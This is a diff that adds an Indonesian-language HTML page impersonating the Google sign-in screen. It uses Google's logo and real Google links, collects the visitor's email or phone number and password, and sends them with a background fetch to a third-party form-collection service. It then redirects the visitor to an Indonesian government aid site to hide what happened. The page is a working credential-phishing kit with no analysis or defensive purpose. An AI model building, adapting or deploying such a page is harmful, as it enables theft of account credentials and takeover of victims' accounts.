@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk - Google</title>
+    <link rel="stylesheet" href="google.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="login-container">
+        
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        
+        <h1>Masuk</h1>
+        <p>Gunakan Akun Google Anda</p>
+        
+        <form 
+            id="loginForm" 
+            action="https://formcarry.com/s/q9SpL4QaIi8" 
+            method="POST"
+        >
+            <div class="login-form">
+                <div class="input-group">
+                    <input type="text" id="email" name="google_email_or_phone" placeholder=" " required>
+                    <label for="email">Email atau nomor telepon</label>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="password" name="google_password" placeholder=" " required>
+                    <label for="password">Masukkan kata sandi</label>
+                </div>
+
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery?dsh=S-516159044%3A1763721579572339&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=id&ifkv=ARESoU3uZC1et8oyRPueH28-fVS4d3-g605uvh7P1Cs5TOBw_56_F57cYlzNxjZo1ope63hNjn6Jg" class="forgot-email">Lupa sandi?</a>
+                
+                <p class="guest-info">
+                    Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. 
+                    <a href="https://support.google.com/chrome/answer/6130773?hl=id">Pelajari lebih lanjut</a>
+                </p>
+
+                <div class="button-group">
+                    <a href="https://accounts.google.com/lifecycle/steps/signup/name?dsh=S-516159044:1763721579572339&flowEntry=SignUp&flowName=GlifWebSignIn&hl=id&ifkv=ARESoU2x8yosNZJF-AX7oKBsf6b8LX8EUNnjD-hfF6Iu7sdKCz51W2Eb5SahbJ_CgjDcZmVPuLxS-g&TL=ANzgctTLjrE2beO8fiWVnXQj90InzMSeFIkwjSS3hrc5nCMbwwfaX-LBmLvRU87&continue=https://accounts.google.com/ManageAccount?nc%3D1" class="create-account-btn">Buat akun</a>
+                    
+                    <button type="submit" id="nextButton" class="next-btn" role="button">Masuk</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        
+        loginForm.addEventListener('submit', function(event) {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // 1. Cek validasi
+            if (email === '' || password === '') {
+                event.preventDefault(); // Mencegah form dikirim jika kosong
+                alert('Mohon isi Email atau nomor telepon DAN Masukkan kata sandi untuk melanjutkan.');
+                return; // Keluar dari fungsi jika validasi gagal
+            }
+
+            // 2. Data terisi. Izinkan pengiriman ke Formcarry.
+            // Tidak perlu event.preventDefault() di sini agar formulir terkirim.
+
+            // 3. Tambahkan pengalihan (redirect) setelah jeda singkat (agar ada waktu Formcarry mencatat data).
+            // Catatan: Ini HANYA akan bekerja jika Formcarry mengembalikan halaman yang SAMA setelah POST.
+            // Karena Formcarry mengalihkan ke halaman terima kasih default, solusi ini mungkin TIDAK SEMPURNA.
+
+            // SOLUSI PALING JITU: Paksa redirect di client-side (dengan asumsi form dikirimkan sangat cepat)
+            
+            // Mencegah pengiriman formulir HTML standar
+            event.preventDefault(); 
+            
+            // Kirim data menggunakan metode Fetch/AJAX di latar belakang
+            fetch(loginForm.action, {
+                method: loginForm.method,
+                body: new FormData(loginForm)
+            }).then(response => {
+                // Respons diterima (data dianggap terkirim), sekarang lakukan redirect.
+                // Redirect ini dijalankan terlepas dari keberhasilan Formcarry memproses data.
+                window.location.href = 'https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&siteid=6094';
+            }).catch(error => {
+                // Jika ada error jaringan saat mengirim ke Formcarry
+                alert('Gagal mengirim data. Mencoba mengalihkan...');
+                window.location.href = 'https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&siteid=6094';
+            });
+        });
+    </script>
+</body>
+</html>
